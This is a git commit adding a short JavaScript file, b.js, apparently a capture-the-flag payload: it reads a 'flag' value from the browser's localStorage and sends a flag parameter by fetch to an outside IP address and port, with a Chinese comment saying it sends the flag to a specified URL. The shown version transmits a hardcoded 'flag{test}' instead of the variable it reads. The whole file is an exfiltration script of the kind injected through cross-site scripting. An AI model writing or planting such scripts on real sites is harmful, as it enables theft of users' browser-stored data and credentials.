4df018f83459628fa02258606e4c72527a0880ab
zIxyd <135143808+zIxyd@users.noreply.github.com>
2024-10-23 21:02:01 +0800

    Create b.js

---
+++ b.js
@@ -0,0 +1,9 @@
+const flag = localStorage.getItem('flag');
+
+// 发送 flag 值到指定的 URL
+fetch(`http://81.71.13.76:5859?flag=flag{test}`, {
+    method: 'GET',
+})
+.then(response => response.text())
+.then(data => console.log('Response:', data))
+.catch(error => console.error('Error:', error));
